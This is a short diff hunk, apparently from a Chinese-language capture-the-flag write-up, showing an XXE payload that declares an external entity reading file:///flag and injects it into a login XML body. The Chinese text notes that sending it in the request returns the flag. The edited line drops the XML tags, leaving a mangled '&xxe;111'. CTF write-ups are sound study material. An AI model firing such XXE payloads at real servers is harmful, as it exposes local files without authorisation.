@@ -79,7 +79,7 @@ HNGK-xxx
 
 <!ENTITY xxe SYSTEM “file:///flag” >]>
 
-<user><username>&xxe;</username><password>111</password></user>
+&xxe;111
 
 在包里填充发送，flag一把哈出来了
 
